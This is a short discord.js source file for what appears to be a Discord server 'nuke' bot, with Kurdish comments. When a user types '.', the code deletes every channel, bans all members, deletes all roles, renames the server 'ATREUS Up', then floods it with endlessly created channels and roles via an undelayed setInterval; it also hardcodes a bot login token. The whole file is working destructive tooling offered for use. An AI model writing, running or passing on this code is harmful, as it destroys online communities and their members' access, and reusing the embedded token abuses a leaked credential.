const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("ATREUS Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("ATREUS Up", "text");///////bo channel 
        message.guild.createChannel("ATREUS Up", "voice");////bo voice
        message.guild.createRole({ name: "ATREUS Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODY5NTExOTQzMzk0ODQwNTc2.YP_SGg.PAQB-uOpor5LIvszTKR30KOOdQk")
